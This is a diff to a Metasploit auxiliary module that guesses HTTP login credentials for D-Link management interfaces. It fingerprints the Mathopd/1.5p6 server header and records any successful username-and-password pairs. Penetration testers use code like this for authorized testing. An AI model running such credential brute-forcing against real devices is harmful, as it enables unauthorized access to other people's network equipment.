@@ -74,40 +74,16 @@ class Metasploit3 < Msf::Auxiliary
 		if result == :success
 			print_good("#{target_url} - Successful login '#{user}' : '#{pass}'")
 
-			any_user = false
-			any_pass = false
-
-			vprint_status("#{target_url} - Trying random username with password:'#{pass}'")
-			any_user  =  determine_result(do_http_login(Rex::Text.rand_text_alpha(8), pass))
-
-			vprint_status("#{target_url} - Trying username:'#{user}' with random password")
-			any_pass  = determine_result(do_http_login(user, Rex::Text.rand_text_alpha(8)))
-
-			if any_user == :success
-				user = "anyuser"
-				print_status("#{target_url} - Any username with password '#{pass}' is allowed")
-			else
-				print_status("#{target_url} - Random usernames are not allowed.")
-			end
-
-			if any_pass == :success
-				pass = "anypass"
-				print_status("#{target_url} - Any password with username '#{user}' is allowed")
-			else
-				print_status("#{target_url} - Random passwords are not allowed.")
-			end
-
 			report_auth_info(
 				:host   => rhost,
 				:port   => rport,
 				:sname => (ssl ? 'https' : 'http'),
 				:user   => user,
 				:pass   => pass,
-				:proof  => "WEBAPP=\"Generic\", PROOF=#{response.to_s}",
+				:proof  => "WEBAPP=\"DLink Management Interface\", PROOF=#{response.to_s}",
 				:active => true
 			)
 
-			return :abort if ([any_user,any_pass].include? :success)
 			return :next_user
 		else
 			vprint_error("#{target_url} - Failed to login as '#{user}'")
@@ -127,6 +103,10 @@ class Metasploit3 < Msf::Auxiliary
 					"login" => "+Log+In+"
 				}
 			})
+			return if response.nil?
+			return if (response.headers['Server'].nil? or response.headers['Server'] !~ /Mathopd\/1\.5p6/)
+			return if (response.code == 404)
+
 			return response
 		rescue ::Rex::ConnectionError
 			vprint_error("#{target_url} - Failed to connect to the web server")
